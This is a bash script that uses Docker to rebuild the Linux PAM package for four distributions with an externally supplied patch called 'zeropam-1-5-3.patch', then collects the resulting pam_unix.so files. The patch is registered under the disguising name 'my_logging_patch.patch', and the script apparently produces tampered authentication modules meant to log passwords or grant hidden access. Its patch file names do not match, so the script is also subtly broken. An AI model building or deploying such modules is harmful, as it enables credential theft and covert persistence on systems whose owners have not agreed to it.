#!/usr/bin/env bash
set -euo pipefail

DISTRO=$1
PATCH=$(realpath ./dynamic_build/patches/zeropam-1-5-3.patch)
OUTDIR=$(realpath ./dynamic_build/output)
mkdir -p "$OUTDIR"

case "$DISTRO" in
  ubuntu24) DOCKERFILE="Dockerfiles/Dockerfile.ubuntu24" ;;
  debian12) DOCKERFILE="Dockerfiles/Dockerfile.debian12" ;;
  rocky9)   DOCKERFILE="Dockerfiles/Dockerfile.rocky9" ;;
  fedora42) DOCKERFILE="Dockerfiles/Dockerfile.fedora42" ;;
  *) echo "Unsupported distro: $DISTRO" && exit 1 ;;
esac

IMAGE="pam_build_${DISTRO}"

echo "[*] Building container image for $DISTRO..."
docker build -t $IMAGE -f $DOCKERFILE .

echo "[*] Running build process for $DISTRO..."
docker run --rm -v "$OUTDIR":/out -v "$PATCH":/tmp/patch.patch $IMAGE bash -c "
  set -e
  mkdir -p /build && cd /build

  if [[ '$DISTRO' == ubuntu* || '$DISTRO' == debian* ]]; then
    apt-get source libpam0g
    cd pam-*
    cp /tmp/patch.patch debian/patches/
    echo 'my_logging_patch.patch' >> debian/patches/series
    debuild -b -uc -us
    find .. -name pam_unix.so -exec cp {} /out/pam_unix_${DISTRO}.so \;
  else
    dnf download --source pam
    rpm -ivh pam-*.src.rpm
    cd ~/rpmbuild/SPECS
    cp /tmp/patch.patch ../SOURCES/
    sed -i '/^%prep/a %patch9999 -p1' pam.spec
    echo 'Patch9999: my_logging_patch.patch' >> pam.spec
    rpmbuild -ba pam.spec
    find ~/rpmbuild/BUILDROOT -name pam_unix.so -exec cp {} /out/pam_unix_${DISTRO}.so \;
  fi
"

echo "[+] Build complete for $DISTRO — output saved to $OUTDIR/pam_unix_${DISTRO}.so"